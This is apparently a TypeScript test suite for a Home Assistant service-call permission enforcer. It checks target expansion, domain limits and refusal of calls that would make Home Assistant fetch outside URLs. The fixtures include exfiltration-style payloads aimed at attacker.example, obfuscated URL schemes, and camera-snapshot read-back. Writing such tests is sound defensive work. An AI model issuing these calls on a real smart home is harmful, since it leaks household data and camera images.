import { describe, expect, test } from "bun:test";
import { enforceServiceCall, expandTargets, RegistryMirror } from "./enforcement";

function mirror(): RegistryMirror {
  const m = new RegistryMirror();
  m.replace(
    [
      { entity_id: "light.living", device_id: "dev1", area_id: null, labels: [] },
      { entity_id: "light.kitchen", device_id: "dev2", area_id: "kitchen", labels: ["mood"] },
      { entity_id: "lock.front_door", device_id: "dev3", area_id: "hall", labels: [] },
      { entity_id: "sensor.dev1_power", device_id: "dev1", area_id: null, labels: [] },
    ],
    [
      { id: "dev1", area_id: "living", labels: ["smart"] },
      { id: "dev2", area_id: "kitchen", labels: [] },
      { id: "dev3", area_id: "hall", labels: [] },
    ],
  );
  return m;
}

describe("expandTargets", () => {
  test("entity ids pass through from target", () => {
    expect(
      expandTargets(
        { domain: "light", service: "turn_on", target: { entity_id: "light.living" } },
        mirror(),
      ),
    ).toEqual(["light.living"]);
  });

  test("entity ids hidden in service data are NOT ignored (smuggling)", () => {
    expect(
      expandTargets(
        { domain: "light", service: "turn_on", data: { entity_id: ["lock.front_door"] } },
        mirror(),
      ),
    ).toEqual(["lock.front_door"]);
  });

  test("device target expands to all its entities", () => {
    expect(
      expandTargets(
        { domain: "light", service: "turn_on", target: { device_id: "dev1" } },
        mirror(),
      ).sort(),
    ).toEqual(["light.living", "sensor.dev1_power"]);
  });

  test("area target expands through entity area AND device area", () => {
    const ids = expandTargets(
      { domain: "light", service: "turn_on", target: { area_id: "living" } },
      mirror(),
    );
    // light.living has no own area but its device sits in "living".
    expect(ids).toEqual(["light.living", "sensor.dev1_power"]);
  });

  test("label target matches entity labels and device labels", () => {
    const byEntityLabel = expandTargets(
      { domain: "light", service: "turn_on", target: { label_id: "mood" } },
      mirror(),
    );
    expect(byEntityLabel).toEqual(["light.kitchen"]);

    const byDeviceLabel = expandTargets(
      { domain: "light", service: "turn_on", target: { label_id: "smart" } },
      mirror(),
    ).sort();
    expect(byDeviceLabel).toEqual(["light.living", "sensor.dev1_power"]);
  });

  test("target and data sources merge without duplicates", () => {
    const ids = expandTargets(
      {
        domain: "light",
        service: "turn_on",
        target: { entity_id: "light.living" },
        data: { entity_id: "light.living", area_id: "kitchen" },
      },
      mirror(),
    ).sort();
    expect(ids).toEqual(["light.kitchen", "light.living"]);
  });

  test("non-string garbage in id fields is dropped, not crashed on", () => {
    expect(
      expandTargets(
        {
          domain: "light",
          service: "turn_on",
          target: { entity_id: [42, null, "light.living"], device_id: {} },
        },
        mirror(),
      ),
    ).toEqual(["light.living"]);
  });
});

describe("enforceServiceCall", () => {
  const lightOnly = [{ domain: "light", access: "control" as const }];

  test("allows a covered call", () => {
    const verdict = enforceServiceCall(
      lightOnly,
      { domain: "light", service: "turn_on", target: { entity_id: "light.living" } },
      mirror(),
    );
    expect(verdict.allowed).toBe(true);
  });

  test("denies cross-domain even when routed through an area", () => {
    // Area "hall" contains the lock; a light-only widget targeting the area
    // with a lock call must be denied.
    const verdict = enforceServiceCall(
      lightOnly,
      { domain: "lock", service: "unlock", target: { area_id: "hall" } },
      mirror(),
    );
    expect(verdict.allowed).toBe(false);
    expect(verdict.entityIds).toEqual(["lock.front_door"]);
  });

  test("denies when expansion pulls in an out-of-domain entity", () => {
    // dev1 carries a light AND a sensor; light-only control of the device
    // would touch the sensor entity, so the whole call is denied.
    const verdict = enforceServiceCall(
      lightOnly,
      { domain: "light", service: "turn_on", target: { device_id: "dev1" } },
      mirror(),
    );
    expect(verdict.allowed).toBe(false);
  });

  test("denies smuggled data.entity_id outside narrowing", () => {
    const narrowed = [{ domain: "light", access: "control" as const, entities: ["light.kitchen"] }];
    const verdict = enforceServiceCall(
      narrowed,
      {
        domain: "light",
        service: "turn_on",
        target: { entity_id: "light.kitchen" },
        data: { entity_id: "light.living" },
      },
      mirror(),
    );
    expect(verdict.allowed).toBe(false);
  });

  test("empty grants deny everything", () => {
    const verdict = enforceServiceCall(
      [],
      { domain: "light", service: "turn_on", target: { entity_id: "light.living" } },
      mirror(),
    );
    expect(verdict.allowed).toBe(false);
  });
});

describe("service fields that make Home Assistant fetch a URL", () => {
  const grants = [
    { domain: "media_player", access: "control" as const },
    { domain: "downloader", access: "control" as const },
    { domain: "notify", access: "control" as const },
  ];
  const speaker = { entity_id: "media_player.kitchen" };

  const exits: [string, Parameters<typeof enforceServiceCall>[1]][] = [
    [
      "play_media content id",
      {
        domain: "media_player",
        service: "play_media",
        target: speaker,
        data: { media_content_id: "https://attacker.example/?d=home", media_content_type: "music" },
      },
    ],
    [
      "play_media art in metadata (read-back through HA's proxy)",
      {
        domain: "media_player",
        service: "play_media",
        target: speaker,
        data: {
          media_content_id: "media-source://radio_browser/abc",
          media_content_type: "music",
          extra: { metadata: { images: [{ url: "http://cam.local/snap.jpg" }] } },
        },
      },
    ],
    [
      "download_file url",
      { domain: "downloader", service: "download_file", data: { url: "http://10.0.0.5/x" } },
    ],
    [
      "notify attachment",
      {
        domain: "notify",
        service: "mobile_app_phone",
        data: { data: { image: "//attacker.example/i.png" } },
      },
    ],
    [
      "rtsp stream",
      {
        domain: "media_player",
        service: "play_media",
        target: speaker,
        data: { media_content_id: " RTSP://cam.local/live", media_content_type: "video" },
      },
    ],
    [
      "url inside a provider id",
      {
        domain: "media_player",
        service: "play_media",
        target: speaker,
        data: { media_content_id: "builtin://track/https://attacker.example/a.mp3" },
      },
    ],
    [
      "composite scheme",
      {
        domain: "media_player",
        service: "play_media",
        target: speaker,
        data: { media_content_id: "hls+https://attacker.example/x.m3u8" },
      },
    ],
    [
      "backslash scheme-relative",
      {
        domain: "media_player",
        service: "play_media",
        target: speaker,
        data: { media_content_id: "\\\\attacker.example\\share" },
      },
    ],
    ...[
      "https:attacker.example/x",
      "ht\ttps://attacker.example/x",
      "zip://https%3A%2F%2Fa.example%2Fx.zip/a.mp3",
      "x-sonosapi-hls://attacker.example/x",
      "{{ 'https:' ~ '//a.example' }}",
    ].map((id): [string, Parameters<typeof enforceServiceCall>[1]] => [
      `content id ${JSON.stringify(id)}`,
      {
        domain: "media_player",
        service: "play_media",
        target: speaker,
        data: { media_content_id: id },
      },
    ]),
    [
      "url as an object key",
      {
        domain: "notify",
        service: "mobile_app_phone",
        data: { data: { "https://attacker.example/x": 1 } },
      },
    ],
  ];

  for (const [name, call] of exits) {
    test(`refuses ${name}`, () => {
      const verdict = enforceServiceCall(grants, call, mirror());
      expect(verdict.allowed).toBe(false);
    });
  }

  test("allows media sources and provider ids that stay inside Home Assistant", () => {
    for (const id of [
      "media-source://media_source/local/song.mp3",
      "spotify:track:4uLU6hMCjMI75M1A2tKUQC",
      "library://track/123",
      "spotify://track/4uLU6hMCjMI75M1A2tKUQC",
      "filesystem_smb--a1b2://track/Music/song.flac",
      "apple_music://album/1",
    ]) {
      const verdict = enforceServiceCall(
        grants,
        {
          domain: "media_player",
          service: "play_media",
          target: speaker,
          data: { media_content_id: id, media_content_type: "music" },
        },
        mirror(),
      );
      expect(verdict.allowed).toBe(true);
    }
  });

  test("allows prose that mentions a scheme word", () => {
    const verdict = enforceServiceCall(
      [{ domain: "notify", access: "control" as const }],
      {
        domain: "notify",
        service: "notify",
        data: { message: "Backup file: done, see http status" },
      },
      mirror(),
    );
    expect(verdict.allowed).toBe(true);
  });
});
